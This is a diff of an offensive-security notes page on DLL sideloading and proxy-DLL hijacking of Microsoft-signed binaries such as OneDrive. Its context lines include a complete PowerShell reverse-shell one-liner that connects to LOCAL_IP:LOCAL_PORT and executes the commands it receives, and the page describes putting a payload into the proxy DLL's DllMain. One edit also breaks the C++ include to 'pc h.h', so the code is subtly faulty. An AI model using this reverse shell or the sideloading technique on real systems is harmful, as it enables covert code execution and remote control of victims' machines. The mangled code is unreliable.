@@ -35,7 +35,7 @@ Identify a Microsoft-signed binary that loads a DLL not present on the system (s
 5. Current working directory
 6. Directories in `%PATH%`
 
-Use **ProcMon** (Sysinternals) to find missing DLL loads. Transfer it to the target machine if needed (see `[[Windows File Transfer]]`).
+Use **ProcMon** (Sysinternals) to find missing DLL loads. Transfer it to the target machine if needed (see [[Windows File Transfer]]).
 
 Set these ProcMon filters to find sideloading opportunities:
 1. **Process Name** contains `OneDrive` (or your target binary)
@@ -68,10 +68,10 @@ The proxy DLL:
 
 Use this approach when only a small number of functions need to be forwarded.
 
-Create a new DLL project in Visual Studio and replace `dllmain.cpp` with:
+Create a new Dynamic-Link Library (DLL) project in Visual Studio and replace `dllmain.cpp` with:
 
 ```cpp
-#include "pch.h"
+#include "pc h.h"
 #include <Windows.h>
 
 // Path to the real DLL — using device path to avoid PATH resolution issues
@@ -120,14 +120,14 @@ The [Perfect DLL Proxy](https://github.com/mrexodia/perfect-dll-proxy) tool read
 C:\> pip install perfect-dll-proxy
 ```
 
-2. Generate the proxy source from the legitimate DLL:
+2. Generate the proxy DLL from the legitimate DLL:
 ```cmd
 C:\> python perfect_dll_proxy.py C:\Windows\System32\secur32.dll
 # Outputs: secur32.cpp (and secur32.def)
 ```
 
 > [!Important]
-> Before generating, rename your proxy file to match the target DLL name exactly (e.g., `secur32.dll`). The generated forward paths reference the DLL by name.
+> Before generating, the DLL name must match the target DLL name exactly (e.g., `secur32.dll`). The generated forward paths reference the DLL by name.
 
 3. Open the generated `.cpp` file in Visual Studio and inject your payload into `DllMain`:
 
@@ -185,7 +185,7 @@ Write-Output $MyBase64_2
 ```
 
 > [!Note]
-> The powershell script `run.ps1` contains the same content as the Option 1:
+> The powershell script `run.ps1` contains the following content (PS1 reverse shell, same as option 1):
 > ```powershell
 > $client = New-Object System.Net.Sockets.TCPClient('LOCAL_IP',LOCAL_PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 > ```
@@ -219,6 +219,8 @@ case DLL_PROCESS_ATTACH:
 # Step 4 — Compile the Proxy DLL
 
 **On Windows (Visual Studio):**
+- Create a new Dynamic-Link Library (DLL) Project
+- Paste the full code into the cpp file
 - Change build configuration from **Debug** to **Release**
 - Target: **x64** (match the target binary architecture)
 - Build → Build Solution
